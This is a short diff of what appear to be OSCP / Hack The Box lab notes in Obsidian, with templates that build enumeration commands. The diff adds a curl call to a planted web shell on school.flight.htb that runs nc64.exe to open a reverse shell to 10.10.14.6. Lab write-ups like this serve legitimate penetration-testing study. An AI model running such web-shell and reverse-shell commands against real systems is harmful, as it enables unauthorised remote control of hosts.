@@ -68,6 +68,7 @@ const command = `kerbrute userenum -d ${discoveredDomain} /usr/share/seclists/Us
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+
 ## looking for Users : looksupid --rid-brute
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
@@ -125,6 +126,9 @@ const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 const command = `curl ${discoveredDomain}/styles/shell.php?cmd=whoami`;
 
 dv.paragraph("```bash\n" + command + "\n```");
+```
+```
+curl -G school.flight.htb/styles/shell.php --data-urlencode 'cmd=nc64.exe -e cmd.exe 10.10.14.6 443'
 ```
 ---
 ## Port 5985 : Evil-WinRM
